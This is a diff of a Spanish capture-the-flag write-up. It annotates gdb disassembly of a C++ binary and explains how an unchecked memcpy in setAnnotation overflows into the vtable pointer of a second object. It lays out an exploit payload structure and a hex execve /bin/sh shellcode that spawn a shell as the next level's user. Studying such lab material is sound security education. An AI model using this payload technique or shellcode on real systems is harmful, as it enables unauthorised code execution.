@@ -15,53 +15,78 @@
 
 4.- Vamos a analizar las funciones de N para ver que datos optenemos
       (gdb) disassemble 0x080486f6
+
     Dump of assembler code for function _ZN1NC2Ei:
       0x080486f6 <+0>:	push   ebp
       0x080486f7 <+1>:	mov    ebp,esp
-      0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
-      0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
-      0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
-      0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
-      0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
+      0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]    ;carga el parametro (this) en eax
+      0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848  ;carga en la dirección de this el valor 0x8048848 (vtable)
+      0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]    ;vuelve a cargar el puntero (this) en eax
+      0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]    ;carga el segundo parametro (int) en edx
+      0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx   ;gurada el parámetro (int) en el offset 0x68 de la clase
       0x0804870b <+21>:	pop    ebp
       0x0804870c <+22>:	ret
     End of assembler dump.
-  
-5.- Esto parece el constructor. Carga el valor del parametro en la posición 0x64 de la instancia de la clase
+   
+    La función _ZN1NC2Ei es:
+      - _ZN significa que es un símbolo manglado.
+      - 1N corresponde al nombre de la clase N.
+      - C2 indica que es el constructor.
+      - i indica que recibe un argumento de tipo entero (int).
+
+    La memoria de la clase sigue este esquema:
+      --------------------------------------------
+      | Offset         | Contenido               |
+      --------------------------------------------
+      | 0x00           | Puntero a la vtable     | <-- `0x8048848`
+      | 0x04           | (posible padding)       |
+      | ...            | Otros miembros (si hay) |
+      | 0x68           | Miembro entero (value)  |
+      -----------------+--------------------------
+    
+  Es el constructor. Carga el valor del parametro en la posición 0x68 de la instancia de la clase
   [...]
-    0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
-    0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
+    0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc] ;segundo parámetro (int)
+    0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx ;almacena en el offset 0x68
   [...]
+
   Esto nos da pistas de que hay lo que parece un int en la posición 0x68 de la clase N
 
-6.- Desensamblamos setAnnotation
-(gdb) disassemble 0x0804870e
-Dump of assembler code for function _ZN1N13setAnnotationEPc:
-   0x0804870e <+0>:	push   ebp
-   0x0804870f <+1>:	mov    ebp,esp
-   0x08048711 <+3>:	sub    esp,0x18
-   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
-   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
-   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
-   0x08048722 <+20>:	add    edx,0x4
-   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
-   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
-   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-   0x08048738 <+42>:	leave
-   0x08048739 <+43>:	ret
-End of assembler dump.
+    * - (vtable):
+      La vtable es una estructura de datos que contiene punteros a las funciones virtuales o sobrecargas 
+      de operadores de una clase. Cuando una clase tiene métodos virtuales o sobrecargas, el compilador 
+      genera una vtable para esa clase. Cada objeto de la clase tiene un puntero a su vtable (llamado vptr), 
+      que se usa en tiempo de ejecución para invocar los métodos correctos, implementando así el polimorfismo.
 
-7.- Vemos que está función hace llamadas a strlen y memcpy y vemos que usa una variable de la clase N
-  [...]  
-    0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
-    0x08048722 <+20>:	add    edx,0x4
-  [...]
-    0x08048730 <+34>:	mov    DWORD PTR [esp],edx
+      Normalmente, el puntero a la vtable, se encuentra en al principio de la instancia del objeto.
+
+6.- Desensamblamos setAnnotation
+  (gdb) disassemble 0x0804870e
+  Dump of assembler code for function _ZN1N13setAnnotationEPc: = setAnnotation(char *)
+    0x0804870e <+0>:	push   ebp
+    0x0804870f <+1>:	mov    ebp,esp
+    0x08048711 <+3>:	sub    esp,0x18
+    0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]  ;parámetro que es puntero a char (char *)
+    0x08048717 <+9>:	mov    DWORD PTR [esp],eax
+    0x0804871a <+12>:	call   0x8048520 <strlen@plt>   ;strlen() al puntero (char *)
+    0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]  ;edx = this
+    0x08048722 <+20>:	add    edx,0x4                  ;edx = this + 0x4
+    0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax  ;longitud de strlen()
+    0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]  ;dirección cadena de origen
+    0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax 
+    0x08048730 <+34>:	mov    DWORD PTR [esp],edx      ;dirección del destino de memcpy()
     0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-  [...]
+    0x08048738 <+42>:	leave
+    0x08048739 <+43>:	ret
+  End of assembler dump.
+
+  El esquema es el siguiente:
+    ------------------------------------------------
+    | Offset         | Contenido                   |
+    ------------------------------------------------
+    | 0x00           | Puntero a la vtable         |
+    | 0x04           | Puntero a la cadena copiada |
+    ------------------------------------------------
 
 8.- Siguiendo la convención de llamadas el primer parametro de la llamada a memcpy() es el puntero destino,
 y vemos que está a 0x4 del inicio de la clase y debe de llegar hasta +0x68 que es donde stá el int miembro de N
@@ -95,7 +120,7 @@ A continuación llama al constructor con un valor fijo.
     0x08048626 <+50>:	mov    DWORD PTR [esp],ebx      ;carga del puntero de clase en esp
     0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>    ;llamada al constructor
   [...]
-    0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
+    0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c     ;codigo de la segunda instancia
     0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
     0x0804863e <+74>:	mov    ebx,eax
     0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
@@ -103,7 +128,7 @@ A continuación llama al constructor con un valor fijo.
     0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   [...]
 
-14.- El main() sigue preparando  y llamando a método setAnnotation(char *) del primer objeto creado con new()
+14.- El main() sigue preparando y llamando a método setAnnotation(char *) del primer objeto creado con new()
 y como argumento le pasa argv[1]
   [...]
     0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
@@ -131,18 +156,11 @@ y como argumento le pasa argv[1]
     0x08048690 <+156>:	mov    DWORD PTR [esp],eax      ;this de obj_2 a esp
     0x08048693 <+159>:	call   edx                      ;llamada a obj_2.operator+(obj_1)
   [...]
-    * - (vtable):
-      La vtable es una estructura de datos que contiene punteros a las funciones virtuales o sobrecargas 
-      de operadores de una clase. Cuando una clase tiene métodos virtuales o sobrecargas, el compilador 
-      genera una vtable para esa clase. Cada objeto de la clase tiene un puntero a su vtable (llamado vptr), 
-      que se usa en tiempo de ejecución para invocar los métodos correctos, implementando así el polimorfismo.
-
-      Normalmente, el puntero a la vtable, se encuentra en al principio de la instancia del objeto.
 
 16.- Vamos con la explotación
 
 17.- El plan es insertar una cadena como argv[1] para que probocar un overflow en el memcyp() y ejecutar una shell como
-usuario bonus0 y obtener la flag haciendo uso del call que hay en main<+159>
+usuario bonus0 y obtener la flag haciendo uso del call que hay en main<+159> (setAnnotation())
 
 18.- Lo primero es ver el offset que proboca el overflow. Usaremos la herramienta online https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 Le pasamos el patron como argv[1] desde gdb
@@ -181,8 +199,11 @@ Con la herramienta online no da un offset de 108
     0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      
   [...]
   Si el payload tiene esta estructura:
+
     [shelcode] + [offset] + [addr shelcode] 
+  
     La primera desreferencia va ha obtener [addr shellcode] para luego desreferenciar los 4 bytes del shellcode dando un crash
+  
     [shelcode] + [offset] + [addr shelcode] 
       ^                          |
       |                          |
@@ -193,18 +214,21 @@ Con la herramienta online no da un offset de 108
       |
       +--[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   
-  Para solucionar esto podemos insertar antes del shellcode otra vez la dirección donde está el shellcode de esta manera
-    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
-    Quedando así
-    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
-      ^                                           |
-      |                                           |
-      +-------------------------------------------+; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+  Para solucionar esto podemos insertar antes del shellcode otra vez la dirección donde está el shellcode + 0x4 de esta manera
 
-    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
-      |                    ^ 
-      |                    |
-      +--------------------+
+    [addr shelcode + 0x4] + [shelcode] + [offset] + [addr shelcode] 
+    
+    Quedando así:
+    
+    [addr shelcode + 0x4] + [shelcode] + [offset] + [addr shelcode] 
+      ^                                                 |
+      |                                                 |
+      +-------------------------------------------------+; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+
+    [addr shelcode + 0x4] + [shelcode] + [offset] + [addr shelcode] ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+      |                          ^ 
+      |                          |
+      +--------------------------+
 
 21.- Lo último que necesitamos es el shellcode que podemos obtenerlo de aquí: https://shell-storm.org/shellcode/files/shellcode-841.html
   \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
